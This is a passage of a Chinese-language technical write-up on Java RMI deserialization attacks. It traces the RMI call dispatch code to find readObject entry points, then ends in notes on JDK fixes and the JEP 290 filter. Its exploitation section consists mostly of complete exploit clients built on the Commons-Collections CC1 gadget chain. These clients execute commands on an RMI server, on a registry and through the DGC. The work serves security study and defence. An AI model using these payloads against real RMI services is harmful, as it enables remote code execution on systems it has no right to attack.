此处再读取一个字节，并判断它的值后再进行处理。这里一共可能3中情况

- _Call: 0x50_
- _Ping: 0x52_
- _DgcAck: 0x53_

由于示例代码是调用远程方法，所以这个字节的内容为`0x50=80`。跟入`Transport#serviceCall`
```java
public boolean serviceCall(final RemoteCall var1) {
    try {
        ObjID var39;
        try {
            var39 = ObjID.read(var1.getInputStream());
        } catch (IOException var33) {
            throw new MarshalException("unable to read objID", var33);
        }

        Transport var40 = var39.equals(dgcID) ? null : this;
        Target var5 = ObjectTable.getTarget(new ObjectEndpoint(var39, var40));
        final Remote var37;
        if (var5 == null || (var37 = var5.getImpl()) == null) {
            throw new NoSuchObjectException("no such object in table");
        }

        final Dispatcher var6 = var5.getDispatcher();
        var5.incrementCallCount();

        boolean var8;
        try {
            transportLog.log(Log.VERBOSE, "call dispatcher");
            final AccessControlContext var7 = var5.getAccessControlContext();
            ClassLoader var41 = var5.getContextClassLoader();
            ClassLoader var9 = Thread.currentThread().getContextClassLoader();

            try {
                setContextClassLoader(var41);
                currentTransport.set(this);

                try {
                    AccessController.doPrivileged(new PrivilegedExceptionAction<Void>() {
                        public Void run() throws IOException {
                            Transport.this.checkAcceptPermission(var7);
                            var6.dispatch(var37, var1);
                            return null;
                        }
                    }, var7);
                    return true;
                } catch (PrivilegedActionException var31) {
                    throw (IOException)var31.getException();
                }
            } finally {
                setContextClassLoader(var9);
                currentTransport.set(null);
            }
        } catch (IOException var34) {
            transportLog.log(Log.BRIEF, "exception thrown by dispatcher: ", var34);
            var8 = false;
        } finally {
            var5.decrementCallCount();
        }

        return var8;
    } catch (RemoteException var36) {
        RemoteException var2 = var36;
        if (UnicastServerRef.callLog.isLoggable(Log.BRIEF)) {
            String var3 = "";

            try {
                var3 = "[" + RemoteServer.getClientHost() + "] ";
            } catch (ServerNotActiveException var30) {
            }

            String var4 = var3 + "exception: ";
            UnicastServerRef.callLog.log(Log.BRIEF, var4, var36);
        }

        try {
            ObjectOutput var38 = var1.getResultStream(false);
            UnicastServerRef.clearStackTraces(var2);
            var38.writeObject(var2);
            var1.releaseOutputStream();
        } catch (IOException var29) {
            transportLog.log(Log.BRIEF, "exception thrown marshalling exception: ", var29);
            return false;
        }
    }

    return true;
}
```
先冲输入流中读入数据并创建一个`ObjID`对象，注意这个输入流是类型为`ConnectionInputStream`是`ObjectInputStream`的子类。而一个`ObjID`对象，需要分别读入`8`个字节（`long`）+`4`个字节（`int`）+`8`个字节（`long`）+`2`个字节（`short`）的内容。
之后从`ObjectTable`中获取对应的`Target`，获取`Dispatcher(UnicastServerRef)`并调用其`UnicastServerRef#dispatch`方法。
```java
public void dispatch(Remote var1, RemoteCall var2) throws IOException {
    try {
        long var4;
        ObjectInput var39;
        try {
            var39 = var2.getInputStream();
            int var3 = var39.readInt();
            if (var3 >= 0) {
                if (this.skel != null) {
                    this.oldDispatch(var1, var2, var3);
                    return;
                }

                throw new UnmarshalException("skeleton class not found but required for client version");
            }

            var4 = var39.readLong();
        } catch (Exception var36) {
            throw new UnmarshalException("error unmarshalling call header", var36);
        }

        MarshalInputStream var40 = (MarshalInputStream)var39;
        var40.skipDefaultResolveClass();
        Method var8 = (Method)this.hashToMethod_Map.get(var4);
        if (var8 == null) {
            throw new UnmarshalException("unrecognized method hash: method not supported by remote object");
        } else {
            this.logCall(var1, var8);
            Class[] var9 = var8.getParameterTypes();
            Object[] var10 = new Object[var9.length];

            try {
                this.unmarshalCustomCallData(var39);

                for(int var11 = 0; var11 < var9.length; ++var11) {
                    var10[var11] = unmarshalValue(var9[var11], var39);
                }
            } catch (IOException var33) {
                throw new UnmarshalException("error unmarshalling arguments", var33);
            } catch (ClassNotFoundException var34) {
                throw new UnmarshalException("error unmarshalling arguments", var34);
            } finally {
                var2.releaseInputStream();
            }

            Object var41;
            try {
                var41 = var8.invoke(var1, var10);
            } catch (InvocationTargetException var32) {
                throw var32.getTargetException();
            }

            try {
                ObjectOutput var12 = var2.getResultStream(true);
                Class var13 = var8.getReturnType();
                if (var13 != Void.TYPE) {
                    marshalValue(var13, var41, var12);
                }

            } catch (IOException var31) {
                throw new MarshalException("error marshalling return", var31);
            }
        }
    } catch (Throwable var37) {
        Object var6 = var37;
        this.logCallException(var37);
        ObjectOutput var7 = var2.getResultStream(false);
        if (var37 instanceof Error) {
            var6 = new ServerError("Error occurred in server thread", (Error)var37);
        } else if (var37 instanceof RemoteException) {
            var6 = new ServerException("RemoteException occurred in server thread", (Exception)var37);
        }

        if (suppressStackTraces) {
            clearStackTraces((Throwable)var6);
        }

        var7.writeObject(var6);
    } finally {
        var2.releaseInputStream();
        var2.releaseOutputStream();
    }
}
```
从这开始根据请求内容的不同，控制流大致会走向两个部分，一个是`this.oldDispatch(var1, var2, var3)`，一个是后面的方法调用`Method var8 = (Method)this.hashToMethod_Map.get(var4);`。先看后者，后者是后续实际的方法调用过程，这一过程会调用`unmarshalValue`来解析参数。
```java
protected static Object unmarshalValue(Class<?> var0, ObjectInput var1) throws IOException, ClassNotFoundException {
    if (var0.isPrimitive()) {
        if (var0 == Integer.TYPE) {
            return var1.readInt();
        } else if (var0 == Boolean.TYPE) {
            return var1.readBoolean();
        } else if (var0 == Byte.TYPE) {
            return var1.readByte();
        } else if (var0 == Character.TYPE) {
            return var1.readChar();
        } else if (var0 == Short.TYPE) {
            return var1.readShort();
        } else if (var0 == Long.TYPE) {
            return var1.readLong();
        } else if (var0 == Float.TYPE) {
            return var1.readFloat();
        } else if (var0 == Double.TYPE) {
            return var1.readDouble();
        } else {
            throw new Error("Unrecognized primitive type: " + var0);
        }
    } else {
        return var1.readObject();
    }
}
```
当参数类型不是基本类型时，就会调用`readObject`。这意味着在特定条件下，这是可以利用的，先记录下来。
再回过头看`this.oldDispatch(var1, var2, var3)`
```java
public void oldDispatch(Remote var1, RemoteCall var2, int var3) throws IOException {
    try {
        long var4;
        ObjectInput var17;
        try {
            var17 = var2.getInputStream();

            try {
                Class var18 = Class.forName("sun.rmi.transport.DGCImpl_Skel");
                if (var18.isAssignableFrom(this.skel.getClass())) {
                    ((MarshalInputStream)var17).useCodebaseOnly();
                }
            } catch (ClassNotFoundException var13) {
            }

            var4 = var17.readLong();
        } catch (Exception var14) {
            throw new UnmarshalException("error unmarshalling call header", var14);
        }

        this.logCall(var1, this.skel.getOperations()[var3]);
        this.unmarshalCustomCallData(var17);
        this.skel.dispatch(var1, var2, var3, var4);
    } catch (Throwable var15) {
        Object var6 = var15;
        this.logCallException(var15);
        ObjectOutput var7 = var2.getResultStream(false);
        if (var15 instanceof Error) {
            var6 = new ServerError("Error occurred in server thread", (Error)var15);
        } else if (var15 instanceof RemoteException) {
            var6 = new ServerException("RemoteException occurred in server thread", (Exception)var15);
        }

        if (suppressStackTraces) {
            clearStackTraces((Throwable)var6);
        }

        var7.writeObject(var6);
    } finally {
        var2.releaseInputStream();
        var2.releaseOutputStream();
    }
}
```
这里根据之前读入的`var3`，判断所需执行的操作，一共有`5`种类型，如下
```java
private static final Operation[] operations = new Operation[]{
    new Operation("void bind(java.lang.String, java.rmi.Remote)"),
    new Operation("java.lang.String list()[]"),
    new Operation("java.rmi.Remote lookup(java.lang.String)"),
    new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
    new Operation("void unbind(java.lang.String)")
};
```
之后调用`this.skel.dispatch(var1, var2, var3, var4)`，如下
### RegistryImpl_Skel
```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var4 != 4905912898345647071L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    } else {
        RegistryImpl var6 = (RegistryImpl)var1;
        switch(var3) {
            case 0:
                String var100;
                Remote var103;
                try {
                    ObjectInput var105 = var2.getInputStream();
                    var100 = (String)var105.readObject();
                    var103 = (Remote)var105.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var100, var103);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1:
                var2.releaseInputStream();
                String[] var99 = var6.list();

                try {
                    ObjectOutput var102 = var2.getResultStream(true);
                    var102.writeObject(var99);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2:
                String var98;
                try {
                    ObjectInput var104 = var2.getInputStream();
                    var98 = (String)var104.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                Remote var101 = var6.lookup(var98);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var101);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3:
                Remote var8;
                String var97;
                try {
                    ObjectInput var11 = var2.getInputStream();
                    var97 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var97, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4:
                String var7;
                try {
                    ObjectInput var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
        }

    }
}
```
依次来看这`5`种操作
#### bind
`bind`操作需要两个参数，类型分别是`String`和`Remote`，这里可以看到都会执行`readObject`操作。不过由于`String`对象是`final`，无法被继承。所以`Remote`这部分可以作为一个利用点，当然这里并不代表`String`这个参数不能打，只是需要自己构造而已的包，并在`tcp`之上于`Registry`进行交互。
#### list
不可控，跳过
#### lookup
与`bind`操作类似，会通过`readObject`尝试获取一个`String`对象
#### rebind
有`readObject`调用
#### unbind
有`readObject`调用
### getRegistry
该方法的具体调用流程不写，直接写结论。它的目的是创建一个`Stub`对象，此过程不会与远程主机进行交互。后续所有调用查找等相关的操作都通过`Stub`对象来进行。
### RegistryImpl_Stub
动态生成的`Stub`类定义如下
```java
package sun.rmi.registry;

import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.rmi.AccessException;
import java.rmi.AlreadyBoundException;
import java.rmi.MarshalException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.UnexpectedException;
import java.rmi.UnmarshalException;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteRef;
import java.rmi.server.RemoteStub;

public final class RegistryImpl_Stub extends RemoteStub implements Registry, Remote {
    private static final Operation[] operations = new Operation[]{
        new Operation("void bind(java.lang.String, java.rmi.Remote)"),
        new Operation("java.lang.String list()[]"),
        new Operation("java.rmi.Remote lookup(java.lang.String)"),
        new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
        new Operation("void unbind(java.lang.String)")
    };
    private static final long interfaceHash = 4905912898345647071L;

    public RegistryImpl_Stub() {
    }

    public RegistryImpl_Stub(RemoteRef var1) {
        super(var1);
    }

    public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
        try {
            RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);

            try {
                ObjectOutput var4 = var3.getOutputStream();
                var4.writeObject(var1);
                var4.writeObject(var2);
            } catch (IOException var5) {
                throw new MarshalException("error marshalling arguments", var5);
            }

            super.ref.invoke(var3);
            super.ref.done(var3);
        } catch (RuntimeException var6) {
            throw var6;
        } catch (RemoteException var7) {
            throw var7;
        } catch (AlreadyBoundException var8) {
            throw var8;
        } catch (Exception var9) {
            throw new UnexpectedException("undeclared checked exception", var9);
        }
    }

    public String[] list() throws AccessException, RemoteException {
        try {
            RemoteCall var1 = super.ref.newCall(this, operations, 1, 4905912898345647071L);
            super.ref.invoke(var1);

            String[] var2;
            try {
                ObjectInput var5 = var1.getInputStream();
                var2 = (String[])var5.readObject();
            } catch (IOException var12) {
                throw new UnmarshalException("error unmarshalling return", var12);
            } catch (ClassNotFoundException var13) {
                throw new UnmarshalException("error unmarshalling return", var13);
            } finally {
                super.ref.done(var1);
            }

            return var2;
        } catch (RuntimeException var15) {
            throw var15;
        } catch (RemoteException var16) {
            throw var16;
        } catch (Exception var17) {
            throw new UnexpectedException("undeclared checked exception", var17);
        }
    }

    public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
        try {
            RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

            try {
                ObjectOutput var3 = var2.getOutputStream();
                var3.writeObject(var1);
            } catch (IOException var18) {
                throw new MarshalException("error marshalling arguments", var18);
            }

            super.ref.invoke(var2);

            Remote var23;
            try {
                ObjectInput var6 = var2.getInputStream();
                var23 = (Remote)var6.readObject();
            } catch (IOException var15) {
                throw new UnmarshalException("error unmarshalling return", var15);
            } catch (ClassNotFoundException var16) {
                throw new UnmarshalException("error unmarshalling return", var16);
            } finally {
                super.ref.done(var2);
            }

            return var23;
        } catch (RuntimeException var19) {
            throw var19;
        } catch (RemoteException var20) {
            throw var20;
        } catch (NotBoundException var21) {
            throw var21;
        } catch (Exception var22) {
            throw new UnexpectedException("undeclared checked exception", var22);
        }
    }

    public void rebind(String var1, Remote var2) throws AccessException, RemoteException {
        try {
            RemoteCall var3 = super.ref.newCall(this, operations, 3, 4905912898345647071L);

            try {
                ObjectOutput var4 = var3.getOutputStream();
                var4.writeObject(var1);
                var4.writeObject(var2);
            } catch (IOException var5) {
                throw new MarshalException("error marshalling arguments", var5);
            }

            super.ref.invoke(var3);
            super.ref.done(var3);
        } catch (RuntimeException var6) {
            throw var6;
        } catch (RemoteException var7) {
            throw var7;
        } catch (Exception var8) {
            throw new UnexpectedException("undeclared checked exception", var8);
        }
    }

    public void unbind(String var1) throws AccessException, NotBoundException, RemoteException {
        try {
            RemoteCall var2 = super.ref.newCall(this, operations, 4, 4905912898345647071L);

            try {
                ObjectOutput var3 = var2.getOutputStream();
                var3.writeObject(var1);
            } catch (IOException var4) {
                throw new MarshalException("error marshalling arguments", var4);
            }

            super.ref.invoke(var2);
            super.ref.done(var2);
        } catch (RuntimeException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw var6;
        } catch (NotBoundException var7) {
            throw var7;
        } catch (Exception var8) {
            throw new UnexpectedException("undeclared checked exception", var8);
        }
    }
}

```
从`Stub`的`list`和`lookup`方法可以到对readObject的调用。
到这里已经一共看到有多个地方是会调用`readObject`的，可见`RMI`的攻击利用可以有多种方式。同时可以看到最终的方法调用过程实际上是由`Stub`和`Skel`对象之间完成的。
### 梳理

- 被远程调用的方法的参数类型为Object（Client攻击Server）
- bind的两个参数
- list的响应
- lookup的参数和响应
- rebind的参数
- unbind的参数
## 利用
在梳理完攻击面之后，就可以尝试去利用了。分场景来看
### 客户端攻击服务端
前面提到被远程调用的方法的参数类型为`Object`时，这个参数在服务端会被反序列化。先看一个简单化的例子，假设服务端提供如下接口可供远程调用
```java
public interface RemoteService extends java.rmi.Remote{
    public void doSome(Message msg) throws RemoteException;
}
```
并且有一个不安全的类实现了`readObject`方法。
```java
public class Exploitable extends Message implements Serializable {
    private static final long serialVersionUID = 7439581476576889858L;
    private String param;

    public Exploitable() throws RemoteException {
        super();
    }

    public String getParam() {
        return param;
    }

    public void setParam(String param) {
        this.param = param;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.param);
    }
}
```
那么可以通过下面这样的代码来利用它
```java
public class EvilRMIClient {
    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);
        /**
         * Suppose the server has a exploitable Class with a readObject() method
         * and the param is controlled.
         */ 
        Exploitable poc = new Exploitable();
        poc.setParam("calc");
        /**
         * When we call remote method, the remote server will try to deserialize 
         * the Exploitable object we passed and the readObject() was called, 
         * leading the command to be executed.
         */
        rs.doSome(poc);
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient rc = new EvilRMIClient();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
```
当然这种情况比较天真，再来看更真实一点的例子，开放的调用接口如下，并且满足`CC1`利用链所需条件
```java
public interface RemoteService extends java.rmi.Remote{
    public void doSome(Object msg) throws RemoteException;
}
```
那么可以通过如下代码进行利用
```java
public class EvilRMIClient {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public void callRemote(String name) throws RemoteException, NotBoundException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);
        rs.doSome(create());
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient rc = new EvilRMIClient();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
```
结果如下
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22838900/1662543200341-b027c845-522b-45c7-851e-24abb59a3149.png#clientId=u468b1646-ec96-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=629&id=u0d2de8d3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=629&originWidth=1234&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112781&status=done&style=shadow&taskId=u7b9389d6-e209-4c9d-b695-9e694d660e9&title=&width=1234)
在前面有提到`DGC`中也存在`readObject`()的调用，也就是在`DGCImpl_Skel#dispatch`中。
为了攻击该目标，首先需要知道服务端的地址和端口，下面的利用代码是假定已知`Registry`和`Server`绑定的名称的情况下。整个攻击过程分为两步

- 获取`RemoteService`，从中拿到服务端的地址和端口
- 获取`DGCImpl_Skel`对应的`ObjID`，创建`UnicaseRef`对象，并通过`DGCImpl_Stub`发起`dirty`调用

完整代码如下
```java
public class EvilRMIClient2ServerDGC {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public RemoteService getRemoteService(String name) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        try {
            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            Field operations = registry.getClass().getDeclaredField("operations");
            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");

            ref.setAccessible(true);
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);
            RemoteRef refs = (RemoteRef) ref.get(registry);

            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);

            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(name);

            invoke.invoke(refs, call);

            return (RemoteService) call.getInputStream().readObject();

        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }

    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);

        try {
            // get remote service
            RemoteService rs = getRemoteService(name);

            // get unicastref info, include target ip:port and ObjID
            Field h = rs.getClass().getSuperclass().getDeclaredField("h");
            h.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) h.get(rs);

            Field ref = handler.getClass().getSuperclass().getDeclaredField("ref");
            ref.setAccessible(true);
            UnicastRef unicastRef = (UnicastRef) ref.get(handler);

            LiveRef innerLiveRef = unicastRef.getLiveRef();
            // Get the target tcpendpoint
            Field ep = innerLiveRef.getClass().getDeclaredField("ep");
            ep.setAccessible(true);
            TCPEndpoint tcpEndpoint = (TCPEndpoint) ep.get(innerLiveRef);
            // Get the unicastRef ObjID to refer target DGCImpl_Skel
            Class a = Class.forName("sun.rmi.transport.DGCClient");
            Field f = a.getDeclaredField("dgcID");
            f.setAccessible(true);
            ObjID dgcID = (ObjID) f.get(null);

            LiveRef targetLiveRef = new LiveRef(dgcID, tcpEndpoint, false);
            // Create a DGCImpl_Stub object
            Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
            Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(new UnicastRef(targetLiveRef));

            Field operations = stub.getClass().getDeclaredField("operations");
            Field interfaceHash = stub.getClass().getDeclaredField("interfaceHash");
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);

            // write evil data
            RemoteCall call = stub.getRef().newCall((RemoteObject) stub, (Operation[]) operations.get(stub), 1, (Long) interfaceHash.get(stub));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(create());

            // call dirty()
            stub.getRef().invoke(call);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2ServerDGC rc = new EvilRMIClient2ServerDGC();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
```
### 客户端攻击注册中心
前面提到，当注册中心在处理`lookup`请求时会尝试从数据流中调用`readObject()`方法读取一个字符串对象。那么只要伪造一个数据流与`Registry`进行交互即可，但是`lookup`方法只接受字符串对象，这里可以选择直接伪造`tcp`连接数据进行攻击，当然这样比较麻烦，切需要对协议有一定了解，并且不通用。
这里通过反射的方式，修改`lookup`方法最终的调用参数。
首先通过前面的分析，`Client`调用`getRegistry()`后会动态创建`RegistryImpl_Stub`并返回，后续操作会由它进行。
其中和`lookup`相关的代码如下
```java
public java.rmi.Remote lookup(java.lang.String $param_String_1)
        throws java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException {
    try {
        StreamRemoteCall call = (StreamRemoteCall)ref.newCall(this, operations, 2, interfaceHash);
        try {
            java.io.ObjectOutput out = call.getOutputStream();
            out.writeObject($param_String_1);
        } catch (java.io.IOException e) {
            throw new java.rmi.MarshalException("error marshalling arguments", e);
        }
        ref.invoke(call);
        java.rmi.Remote $result;
        try {
            java.io.ObjectInput in = call.getInputStream();
            $result = (java.rmi.Remote) in.readObject();
        } catch (ClassCastException | IOException | ClassNotFoundException e) {
            call.discardPendingRefs();
            throw new java.rmi.UnmarshalException("error unmarshalling return", e);
        } finally {
            ref.done(call);
        }
        return $result;
    } catch (java.lang.RuntimeException e) {
        throw e;
    } catch (java.rmi.RemoteException e) {
        throw e;
    } catch (java.rmi.NotBoundException e) {
        throw e;
    } catch (java.lang.Exception e) {
        throw new java.rmi.UnexpectedException("undeclared checked exception", e);
    }
}
```
由此可以通过反射操作，创建一个`StreamRemoteCall`对象，获取期输出流，并调用`writeObject()`向其中写入恶意的反序列化对象。之后`ref.invoke(call);`即可，具体代码如下
```java
public class EvilRMIClient2Registry {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public void callRemote(String name) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        try {
            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
            Field operations = registry.getClass().getDeclaredField("operations");
            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");

            ref.setAccessible(true);
            operations.setAccessible(true);
            interfaceHash.setAccessible(true);
            RemoteRef refs = (RemoteRef) ref.get(registry);

            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);

            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
            ObjectOutput out = call.getOutputStream();
            out.writeObject(create());

            invoke.invoke(refs, call);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2Registry rc = new EvilRMIClient2Registry();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}

```
另一种方式是通过`DGC`进行攻击，这里留到后面结合`JEP290`进行介绍。
### 注册中心攻击客户端
### 注册中心攻击服务端
### 服务端攻击注册中心
### 服务端攻击客户端
## 修复
前面注册中心攻击服务端或者后者攻击前者，都是在两者分开部署的场景下才可能利用。`JDK`仅在低版本允许`Registry`和`Server`分开进行部署。它会检测`Registry`是否在`localhost`。
但这个修复方式在`JDK8u141`前，修复不完整，因为它在检测`Registry`的位置前，已经读取并反序列化传递过来的数据了。
`JDK8u141`后，这个问题被彻底修复，检测被放到了反序列化前。
### JEP 290机制介绍
`JEP290`是一项于`2016`年发起的`Java`标准提案，用于为`Java`虚拟机提供过滤反序列化对象的能力，`RMI`就是其中被支持的一部分模块。
> 有关JEP290的详细介绍，见[https://openjdk.org/jeps/290](https://openjdk.org/jeps/290)。

将`JDK`切换至`JDK8u322`，可见在`RegistryImpl`中有如下过滤器。
```java
/**
 * The registryFilter created from the value of the {@code "sun.rmi.registry.registryFilter"}
 * property.
 */
private static final ObjectInputFilter registryFilter =
        AccessController.doPrivileged((PrivilegedAction<ObjectInputFilter>)RegistryImpl::initRegistryFilter);

/**
 * Initialize the registryFilter from the security properties or system property; if any
 * @return an ObjectInputFilter, or null
 */
private static ObjectInputFilter initRegistryFilter() {
    ObjectInputFilter filter = null;
    String props = System.getProperty(REGISTRY_FILTER_PROPNAME);
    if (props == null) {
        props = Security.getProperty(REGISTRY_FILTER_PROPNAME);
    }
    if (props != null) {
        filter = ObjectInputFilter.Config.createFilter2(props);
        Log regLog = Log.getLog("sun.rmi.registry", "registry", -1);
        if (regLog.isLoggable(Log.BRIEF)) {
            regLog.log(Log.BRIEF, "registryFilter = " + filter);
        }
    }
    return filter;
}


/**
 * ObjectInputFilter to filter Registry input objects.
 * The list of acceptable classes is limited to classes normally
 * stored in a registry.
 *
 * @param filterInfo access to the class, array length, etc.
 * @return  {@link ObjectInputFilter.Status#ALLOWED} if allowed,
